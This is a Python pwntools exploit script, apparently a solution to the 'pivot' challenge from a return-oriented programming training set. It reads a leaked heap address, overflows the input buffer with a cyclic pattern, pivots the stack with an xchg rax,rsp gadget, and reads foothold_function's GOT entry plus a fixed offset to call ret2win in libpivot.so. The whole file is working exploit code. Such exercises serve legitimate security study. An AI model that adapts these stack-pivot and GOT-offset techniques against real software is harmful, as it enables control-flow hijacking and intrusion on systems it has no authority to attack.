from pwn import *
import io
elf = ELF("./pivot")
lib = ELF("./libpivot.so")
p = process("./pivot")

def get_pivot():
    for _ in range(4):
        p.recvline()
    line = p.recvline()
    pivot = p64(int(line[56:69],16))
    return pivot
pivot = get_pivot()


pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
xchg_rax_rsp = p64(0x004009bd)
mov_rax_qword_rax = p64(0x004009c0)
add_rax_rbp = p64(0x004009c4)
call_rax = p64(0x00000000004006b0)

foothold_function = p64(elf.symbols["plt.foothold_function"])
ret2win = p64(lib.symbols["ret2win"])
foothold_function_got_plt = p64(elf.symbols["got.foothold_function"])

# move stack

rop1 = pop_rax + pivot + xchg_rax_rsp

# call ret2win

rop2 = foothold_function
rop2 += pop_rax + foothold_function_got_plt
rop2 += mov_rax_qword_rax
rop2 += pop_rbp + p64(0x00000a81 - 0x0000096a)
rop2 += add_rax_rbp
rop2 += call_rax


p.recvuntil('> ') 
p.send(rop2)  
p.recvuntil('> ')      
random = cyclic(40) + rop1
p.send(random)
p.interactive()
